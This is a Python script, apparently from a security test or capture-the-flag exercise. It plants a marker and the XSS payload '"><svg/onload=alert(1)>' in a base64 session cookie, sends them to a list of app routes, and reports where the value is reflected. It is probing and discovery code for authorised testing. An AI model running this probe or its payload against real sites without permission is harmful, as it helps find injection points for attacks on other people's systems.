"""Probe for reflection of the session cookie's decoded value (the client IP)
across all reachable pages. Anywhere the IP appears verbatim in HTML output is
a candidate XSS sink.

Approach:
  - Set a uniquely-tagged cookie value (base64 of an unusual marker IP).
  - Request many app routes.
  - grep response bodies for the marker.
"""
from __future__ import annotations

import argparse
import base64
import sys
import urllib.request
import urllib.error

ROUTES = (
    "/",
    "/proof",
    "/downloads",
    "/downloads/",
    "/wallet",
    "/contact",
    "/about",
    "/faq",
    "/help",
    "/login",
    "/dashboard",
    "/profile",
    "/me",
    "/admin",
    "/payed",
    "/index.html",
    "/api",
    "/status",
)


def _get(url: str, cookie: str, timeout: float = 6.0) -> tuple[int, bytes, dict[str, str]]:
    req = urllib.request.Request(url=url, method="GET")
    req.add_header("Cookie", cookie)
    req.add_header("User-Agent", "carpe-reflect/1.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, (e.read() if hasattr(e, "read") else b""), dict(e.headers or {})
    except Exception as e:  # noqa: BLE001
        return 0, f"<err:{e}>".encode(), {}


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", required=True)
    p.add_argument("--scheme", default="http")
    p.add_argument(
        "--marker",
        default="203.0.113.99",
        help="unique IP-shaped marker placed in the session cookie",
    )
    p.add_argument(
        "--xss",
        default='"><svg/onload=alert(1)>',
        help="raw XSS payload to also try in the cookie value (post-decode)",
    )
    args = p.parse_args()

    base = f"{args.scheme}://{args.target.rstrip('/')}"
    marker_b64 = base64.b64encode(args.marker.encode()).decode()
    xss_b64 = base64.b64encode(args.xss.encode()).decode()

    cases = [
        ("plain-marker", f"session={marker_b64}", args.marker),
        ("xss-marker", f"session={xss_b64}", args.xss),
    ]

    findings: list[tuple[str, str, str]] = []

    for label, cookie, marker in cases:
        print(f"\n=== case: {label} :: cookie={cookie} ===")
        for route in ROUTES:
            url = base + route
            status, body, headers = _get(url, cookie)
            if status in (0, 404):
                continue
            text = body.decode("utf-8", "replace")
            if marker in text:
                idx = text.find(marker)
                ctx = text[max(0, idx - 80) : idx + len(marker) + 80]
                findings.append((label, route, ctx))
                print(f"  [REFLECTED] {route} ({status})")
                print(f"    ...{ctx!r}...")
            else:
                # also scan response headers (e.g. Set-Cookie echo)
                joined_hdr = "\n".join(f"{k}: {v}" for k, v in headers.items())
                if marker in joined_hdr:
                    findings.append((label, route + " [HEADERS]", joined_hdr))
                    print(f"  [REFLECTED-HDR] {route} ({status})")
                    print(f"    {joined_hdr}")
                else:
                    print(f"  [{status}] {route} (no reflection)")

    print()
    print(f"[+] Total reflection hits: {len(findings)}")
    if not findings:
        print("[i] No reflection found in tested routes. Consider:")
        print("    - logged-in pages behind /login")
        print("    - error pages from malformed proof requests")
        print("    - JS bundles that read document.cookie and render it")
    return 0


if __name__ == "__main__":
    sys.exit(main())
